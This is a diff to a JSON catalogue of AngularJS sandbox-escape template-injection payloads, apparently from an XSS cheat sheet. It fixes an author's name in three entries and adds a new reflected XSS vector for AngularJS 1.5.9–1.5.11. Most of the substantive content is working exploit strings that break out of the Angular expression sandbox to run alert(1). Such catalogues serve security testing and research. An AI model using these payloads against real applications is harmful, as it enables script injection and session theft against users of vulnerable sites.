@@ -39,7 +39,7 @@
         "version": "1.2.0",
         "authors": [
             {
-                "name": "Jan Horn",
+                "name": "Jann Horn",
                 "company": "Google",
                 "twitterUrl": "https:\/\/twitter.com\/tehjh"
             }
@@ -224,12 +224,32 @@
         "version": "1.5.9",
         "authors": [
             {
-                "name": "Jan Horn",
+                "name": "Jann Horn",
                 "company": "Google",
                 "twitterUrl": "https:\/\/twitter.com\/tehjh"
             }
         ],
         "vector": "{{\nc=''.sub.call;b=''.sub.bind;a=''.sub.apply;\nc.$apply=$apply;c.$eval=b;op=$root.$$phase;\n$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;\nC=c.$apply(c);$root.$$phase=op;$root.$digest=od;\nB=C(b,c,b);$evalAsync(\"\nastNode=pop();astNode.type='UnaryExpression';\nastNode.operator='(window.X?void0:(window.X=true,alert(1)))+';\nastNode.argument={type:'Identifier',name:'foo'};\n\");\nm1=B($$asyncQueue.pop().expression,null,$root);\nm2=B(C,null,m1);[].push.apply=m2;a=''.sub;\n$eval('a(b.c)');[].push.apply=a;\n}}",
+        "hash": "",
+        "type": "reflected",
+        "csp": false
+    },
+    {
+        "versionRange": "1.5.9 - 1.5.11",
+        "version": "1.5.9",
+        "authors": [
+            {
+                "name": "Jann Horn",
+                "company": "Google",
+                "twitterUrl": "https:\/\/twitter.com\/tehjh"
+            },
+            {
+                "name": "sp3xsr",
+                "company": "",
+                "twitterUrl": ""
+            }
+        ],
+        "vector": "{{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};\");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}}",
         "hash": "",
         "type": "reflected",
         "csp": false
@@ -289,7 +309,7 @@
         "version": "1.2.0",
         "authors": [
             {
-                "name": "Jan Horn",
+                "name": "Jann Horn",
                 "company": "Google",
                 "twitterUrl": "https:\/\/twitter.com\/tehjh"
             }
